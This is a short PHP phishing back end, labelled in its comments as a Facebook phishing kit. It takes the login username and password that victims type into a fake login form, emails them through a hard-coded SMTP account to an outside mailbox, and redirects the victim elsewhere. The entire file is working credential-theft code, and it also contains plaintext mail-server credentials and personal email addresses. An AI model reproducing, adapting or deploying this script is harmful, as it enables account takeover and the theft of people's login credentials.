
<?php

//PISHING - FACEBOOk - @NORAH_C_IV

require_once("autenvio/PHPMailerAutoload.php");

$mail = new PHPMailer();
 
$mail->IsSMTP(); 
$mail->Host = "mail.bronxservices.net"; // Seu endereço de host SMTP
$mail->SMTPAuth = true; 
$mail->Port = 587; // Padrão "587"
$mail->SMTPSecure = false; 
$mail->SMTPAutoTLS = false; 
$mail->Username = 'norah@bronxservices.net'; // Conta do seu e-mail de domínio
$mail->Password = 'norah235144'; // Senha da sua conta de email de domínio
 
// DADOS DO REMETENTE
$mail->Sender = "norah.c.iv@outlook.com.br"; // Conta de email existente e ativa em seu domínio
$mail->From = "norah@bronxservices.net"; // Email que será rementente do e-mail
$mail->FromName = " Mensagem do Facebook"; // Titulo do Email
 
// DADOS DO DESTINATÁRIO
$mail->AddAddress('norah.c.iv@outlook.com.br', 'Mayday - ByeBye'); // Email para receber email.
 

$mail->IsHTML(true); 
$mail->CharSet = 'utf-8';
 
// DEFINIÇÃO DA MENSAGEM
$mail->Subject  = "Facebook - Conta"; // Assunto da email
$mail->Body .= " E-mail: ".$_POST['login_username']."<br>"; // Login
$mail->Body .= " Senha: ".nl2br($_POST['login_password'])."<br>"; // Senha
 
// P L I M !
$enviado = $mail->Send();

$mail->ClearAllRecipients();

header("location: http://mayday.casa");
 ?>
 
